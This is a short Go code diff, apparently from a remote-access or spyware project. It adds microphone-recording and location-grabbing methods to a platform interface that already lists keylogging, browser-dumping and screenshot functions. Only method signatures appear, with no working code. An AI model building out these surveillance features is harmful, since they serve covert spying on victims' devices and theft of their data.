@@ -9,6 +9,8 @@ type Platform interface {
 	GetKeylogs() string
 	DumpBrowsers() string
 	Screenshot() ([]byte, error)
+	RecordMicrophone() ([]byte, error)
+	GetLocation() ([]byte, error)
 }
 
 // NewPlatform returns a new platform-specific implementation of the Platform interface.
